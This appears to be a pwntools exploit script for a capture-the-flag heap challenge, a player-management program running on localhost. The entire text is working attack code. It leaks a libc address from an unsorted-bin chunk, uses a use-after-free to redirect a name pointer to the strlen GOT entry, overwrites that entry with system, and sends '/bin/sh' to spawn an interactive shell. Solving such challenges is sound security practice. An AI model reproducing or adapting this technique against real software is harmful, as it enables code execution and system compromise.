#!/usr/bin/env python3

from pwn import *

PORT = 1337

io = remote(b'127.0.0.1', PORT)
libc = ELF('./libc.so.6')

#context.log_level = 'debug'


index = 0
def add_player(name):
    io.sendlineafter(b'Your choice: ', b'1')
    io.recvuntil(b'Found free slot: ')
    
    index = int(io.recvline().strip())
    
    io.sendlineafter(b'player name: ', name)
    io.sendlineafter(b'attack points: ', b'1')
    io.sendlineafter(b'defense points: ', b'2')
    io.sendlineafter(b'speed: ', b'3')
    io.sendlineafter(b'precision: ', b'4')
    
    return index

def select_player(player_index):
    io.sendlineafter(b'Your choice: ', b'3')
    io.sendlineafter(b'index: ', f'{player_index}'.encode())


def remove_player(player_index):
    io.sendlineafter(b'Your choice: ',b'2')
    io.sendlineafter(b'index: ',f'{player_index}'.encode())


# print current selected player

def show_player():
    io.sendlineafter(b'Your choice: ', b'5')


def edit_player(name):
    io.sendlineafter(b'Your choice: ',b'4')
    io.sendlineafter(b'Your choice: ',b'1')
    io.sendlineafter(b'new name: ',name)
    io.sendlineafter(b'Your choice: ', b'0')

# leak libc address via reading a chunk linked to unsortedbin

player_A = add_player(b'A'*0x88)
player_B = add_player(b'B'*0x28)

select_player(player_A)

remove_player(player_A)

show_player()

io.recvuntil(b'Name: ')

libc.address = u64(io.recvline().strip().ljust(8,b'\x00')) - 0x3c4b78

log.success(f'libc @ 0x{libc.address:02x}')

player_C = add_player(b'C'*0x88) # allocate the last chunk in the unsortedbin

# arbitrary write via tampering with the name pointer using the use-after-free vulnerability

player_D = add_player(b'D'*0x28)
player_E = add_player(b'E'*0x28)

select_player(player_D)

log.info(f'dangling player @ {player_D}')

log.info('removing player_D and player_E')
remove_player(player_D)

remove_player(player_B)

strlen = 0x603040

player_Z = add_player(b'A'*0x10+ p64(strlen))


edit_player(p64(libc.sym.system)) # edit strlen GOT with system since our input while adding player is passed to strlen('input')


io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'player name: ', b'/bin/sh\x00') # enjoy SHELL

io.interactive()
